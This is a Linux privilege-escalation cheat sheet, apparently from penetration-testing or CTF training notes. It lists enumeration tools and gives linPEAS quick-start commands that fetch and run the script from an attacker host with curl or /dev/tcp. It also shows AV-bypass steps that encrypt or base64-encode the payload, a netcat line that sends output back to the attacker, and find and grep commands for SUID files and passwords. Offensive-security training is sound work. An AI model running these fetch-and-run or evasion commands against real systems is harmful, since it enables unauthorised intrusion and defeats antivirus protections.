# Linux priv esc

#### Enumeration

* LinPeas: [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)&#x20;

Quick Start

```
#From github
curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh | sh

#Local network
sudo python -m SimpleHTTPServer 80 #Host
curl 10.10.10.10/linpeas.sh | sh #Victim

#Without curl
sudo nc -q 5 -lvnp 80 < linpeas.sh #Host
cat < /dev/tcp/10.10.10.10/80 | sh #Victim

#Excute from memory and send output back to the host
nc -lvnp 9002 | tee linpeas.out #Host
curl 10.10.14.20:8000/linpeas.sh | sh | nc 10.10.14.20 9002 #Victim

#Output to file
./linpeas.sh -a > /dev/shm/linpeas.txt #Victim
less -r /dev/shm/linpeas.txt #Read with colors

#AV bypass

#open-ssl encryption
openssl enc -aes-256-cbc -pbkdf2 -salt -pass pass:AVBypassWithAES -in linpeas.sh -out lp.enc
sudo python -m SimpleHTTPServer 80 #Start HTTP server
curl 10.10.10.10/lp.enc | openssl enc -aes-256-cbc -pbkdf2 -d -pass pass:AVBypassWithAES | sh #Download from the victim

#Base64 encoded
base64 -w0 linpeas.sh > lp.enc
sudo python -m SimpleHTTPServer 80 #Start HTTP server
curl 10.10.10.10/lp.enc | base64 -d | sh #Download from the victim
```

* LinEnum: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)&#x20;
* LES (Linux Exploit Suggester): [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)&#x20;
* Linux Smart Enumeration: [https://github.com/diego-treitos/linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)&#x20;
* Linux Priv Checker: [https://github.com/linted/linuxprivchecker](https://github.com/linted/linuxprivchecker)&#x20;
* Enum4linux&#x20;

#### Manual enumeration

```
hostname
uname -a
/proc/version
/etc/issue
ps -A #View all running processes
ps axjf #View process tree
env
sudo -l
ls -lah
id
/etc/passwd
history
ifconfig
ip a

```

**Netstat**

```
netstat -a # shows all listening ports and established connections.
netstat -at or netstat -au  #can also be used to list TCP or UDP protocols respectively.
netstat -l #  list ports in “listening” mode. These ports are open and ready to accept incoming connections. This can be used with the “t” option to list only ports that are listening using the TCP protocol (below)
netstat -s #  list network usage statistics by protocol (below) This can also be used with the -t or -u options to limit the output to a specific protocol.
netstat -tp # list connections with the service name and PID information.
netstat -i # Shows interface statistics. We see below that “eth0” and “tun0” are more active than “tun1”.
netstat -ano # which could be broken down as follows;
# -a: Display all sockets
# -n: Do not resolve names
# -o: Display timers
```

#### Find Command

```
find . -name flag1.txt # find the file named “flag1.txt” in the current directory
find /home -name flag1.txt # find the file names “flag1.txt” in the /home directory
find / -type d -name config    # find the directory named config under “/”
find / -type f -perm 0777     # find files with the 777 permissions 
# (files readable, writable, and executable by all users)
find / -perm a=x    # find executable files
find /home -user frank # find all files for user “frank” under “/home”
find / -mtime 10 # find files that were modified in the last 10 days
find / -atime 10 # find files that were accessed in the last 10 day
find / -cmin -60 # find files changed within the last hour (60 minutes)
find / -amin -60 # find files accesses within the last hour (60 minutes)
find / -size 50M # find files with a 50 MB size

# Folders and files that can be written to or executed from:

find / -writable -type d 2>/dev/null # Find world-writeable folders
find / -perm -222 -type d 2>/dev/null # Find world-writeable folders
find / -perm -o w -type d 2>/dev/null # Find world-writeable folders
find / -perm -o x -type d 2>/dev/null # Find world-executable folders

# Find development tools and supported languages:

find / -name perl*
find / -name python*
find / -name gcc*

find / -perm -u=s -type f 2>/dev/null # Find files with the SUID bit, 
#which allows us to run the file with a higher privilege level than the 
#current user.
```

#### General Linux Commands

As we are in the Linux realm, familiarity with Linux commands, in general, will be very useful. Please spend some time getting comfortable with commands such as `find`, `locate`, `grep`, `cut`, `sort`, etc.



```
grep ./*  -e 'password' #find string in files
```

****

